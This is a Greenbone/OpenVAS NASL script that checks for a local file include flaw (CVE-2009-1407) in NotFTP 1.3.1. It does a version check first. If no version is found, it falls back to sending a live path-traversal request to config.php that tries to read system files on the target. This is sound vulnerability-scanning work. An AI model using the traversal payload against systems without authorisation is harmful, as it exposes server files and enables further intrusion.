# Copyright (C) 2009 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:wonko:notftp";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100161");
  script_version("2021-04-16T06:57:08+0000");
  script_tag(name:"last_modification", value:"2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)");
  script_tag(name:"creation_date", value:"2009-04-24 20:04:08 +0200 (Fri, 24 Apr 2009)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-1407");
  script_bugtraq_id(34636);
  script_name("NotFTP 'config.php' Local File Include Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("notftp_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("notftp/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34636");

  script_tag(name:"summary", value:"NotFTP is prone to a local file-include vulnerability because it
  fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to view and execute arbitrary
  local files in the context of the webserver process. This may aid in further attacks.");

  script_tag(name:"affected", value:"NotFTP 1.3.1 is vulnerable, other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade
  to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_banner");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!infos = get_app_version_and_location(cpe: CPE, port: port, exit_no_version: FALSE))
  exit(0);

vers = infos["version"];
path = infos["location"];

if (vers && vers =~ "[0-9.]+") {
  if (version_is_equal(version: vers, test_version: "1.3.1")) {
    report = report_fixed_ver(installed_version: vers, fixed_version: "None", install_path: path);
    security_message(port: port, data: report);
    exit(0);
  }
# No version found, try to exploit.
} else {

  if (path == "/")
    path = "";

  files = traversal_files();

  foreach file (keys(files)) {
    url = path + "/config.php?newlang=kacper&languages[kacper][file]=../../../../../../../../" + files[file];
    if (http_vuln_check(port: port, url: url, pattern: file, check_header: TRUE )) {
      report = http_report_vuln_url(port: port, url: url);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
